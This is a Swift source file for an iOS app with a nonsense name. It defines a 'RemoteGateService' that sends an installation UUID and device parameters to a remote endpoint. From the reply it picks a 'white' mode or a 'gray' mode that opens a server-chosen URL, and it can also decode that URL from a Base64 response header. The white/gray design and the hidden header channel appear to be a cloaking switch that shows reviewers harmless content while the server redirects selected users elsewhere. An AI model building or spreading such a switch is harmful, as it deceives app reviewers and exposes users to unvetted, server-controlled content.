//
//  RemoteGateService.swift
//  Zorbulsexvor Loxbren
//
//  Created by Nguyen Minhthinh on 12.03.2026.
//

import Foundation

enum RemoteGateService {
    private static let tag = "[RemoteGate]"

    private struct GateJSONBody: Decodable {
        var url: String?
    }

    enum Result {
        case white
        case gray(URL)
    }

    /// Gray: HTTP 200 and (1) JSON body with valid `url`, or (2) fallback header Base64 → http(s) URL. Anything else → white.
    static func fetch() async -> Result {
        let uuid = InstallationIdentifierStore.shared.installationUUID()
        var components = URLComponents(url: LoadingConfig.endpointURL, resolvingAgainstBaseURL: true)!
        components.queryItems = DeviceQueryParameters.buildItems(uuid: uuid)
        guard let url = components.url else {
            print("\(tag) fetch aborted: could not build request URL")
            return .white
        }

        print("\(tag) GET \(url.absoluteString)")

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 25

        do {
            let (data, response) = try await URLSession.shared.data(for: request)
            guard let http = response as? HTTPURLResponse else {
                print("\(tag) response is not HTTPURLResponse → white")
                return .white
            }

            logHTTPResponse(http, body: data)

            guard http.statusCode == 200 else {
                print("\(tag) reason white: status \(http.statusCode) != 200")
                return .white
            }

            if let link = grayURLFromJSONBody(data) {
                print("\(tag) gray: JSON `url` → \(link.absoluteString)")
                return .gray(link)
            }

            if let link = grayURLFromResponseHeader(http) {
                print("\(tag) gray: header `\(LoadingConfig.responseHeaderKey)` Base64 → \(link.absoluteString)")
                return .gray(link)
            }

            print("\(tag) reason white: no valid JSON `url` and no valid header `\(LoadingConfig.responseHeaderKey)` (Base64 http(s) URL)")
            return .white
        } catch {
            print("\(tag) reason white: network error \(error.localizedDescription)")
            if let urlError = error as? URLError {
                print("\(tag) URLError code=\(urlError.code.rawValue) \(urlError.code)")
            }
            return .white
        }
    }

    private static func grayURLFromJSONBody(_ data: Data) -> URL? {
        guard !data.isEmpty else { return nil }
        guard let body = try? JSONDecoder().decode(GateJSONBody.self, from: data) else {
            print("\(tag) JSON: decode failed (not an object or invalid JSON)")
            return nil
        }
        guard let raw = body.url?.trimmingCharacters(in: .whitespacesAndNewlines), !raw.isEmpty else {
            print("\(tag) JSON: field `url` missing or empty")
            return nil
        }
        guard let link = validatedHTTPURL(from: raw) else {
            print("\(tag) JSON: `url` is not a valid http(s) URL: \(raw.prefix(160))")
            return nil
        }
        return link
    }

    private static func grayURLFromResponseHeader(_ http: HTTPURLResponse) -> URL? {
        let headerKey = LoadingConfig.responseHeaderKey
        let raw = http.value(forHTTPHeaderField: headerKey)?
            .trimmingCharacters(in: .whitespacesAndNewlines) ?? ""
        guard !raw.isEmpty else {
            print("\(tag) header: `\(headerKey)` missing or empty")
            return nil
        }

        print("\(tag) header `\(headerKey)` length=\(raw.count) (Base64 decode)")

        guard let decodedData = Data(base64Encoded: raw, options: [.ignoreUnknownCharacters]) else {
            print("\(tag) header: Base64 decode failed")
            return nil
        }
        let string = String(data: decodedData, encoding: .utf8)?
            .trimmingCharacters(in: .whitespacesAndNewlines) ?? ""
        guard !string.isEmpty else {
            print("\(tag) header: decoded UTF-8 empty")
            return nil
        }
        guard let link = validatedHTTPURL(from: string) else {
            print("\(tag) header: decoded string is not http(s) URL: \(string.prefix(120))")
            return nil
        }
        return link
    }

    private static func validatedHTTPURL(from string: String) -> URL? {
        let s = string.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !s.isEmpty, let link = URL(string: s) else { return nil }
        let scheme = (link.scheme ?? "").lowercased()
        guard scheme == "http" || scheme == "https" else { return nil }
        return link
    }

    private static func logHTTPResponse(_ http: HTTPURLResponse, body: Data) {
        let keys = http.allHeaderFields.keys.map { String(describing: $0) }.sorted()
        print("\(tag) HTTP status=\(http.statusCode) headers keys (\(keys.count)): \(keys.joined(separator: ", "))")
        if let ct = http.value(forHTTPHeaderField: "Content-Type") {
            print("\(tag) Content-Type: \(ct)")
        }
        print("\(tag) body bytes=\(body.count)")
        if !body.isEmpty, body.count <= 512, let preview = String(data: body, encoding: .utf8) {
            print("\(tag) body UTF-8 preview: \(preview)")
        }
    }
}
